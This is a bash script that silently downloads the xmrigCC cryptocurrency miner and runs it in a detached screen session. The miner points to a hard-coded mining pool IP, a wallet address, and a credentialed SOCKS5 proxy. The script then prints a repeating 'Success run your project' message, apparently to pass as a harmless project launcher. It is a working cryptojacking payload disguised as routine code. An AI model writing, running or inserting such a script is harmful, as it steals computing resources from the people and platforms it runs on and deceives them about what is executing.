#!/bin/bash

nohup sudo apt install screen -y
wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-3.3.3-linux-generic-static-amd64.tar.gz
tar -xvf xmrigCC-3.3.3-linux-generic-static-amd64.tar.gz 
cd miner 
screen -d -m ./xmrigDaemon -o 103.120.19.245:80 -u ZEPHs8zu79g5jBLoah9WSu7FXu2CqyP5DLxSdLL12KAfSaG5f4GHGE1BVAcNbmefyjR7Mj4LGt8W989DBaXFGuM8ajUrgSDXAEg.LOOT-$(echo $(shuf -i 1-999 -n 1)) -p x -a rx/0 -k --donate-level 1 -x socks5://temera88:temera88@45.88.24.139:443


while true
do
    echo "Good Job!, Success run your project."
    sleep 5
done
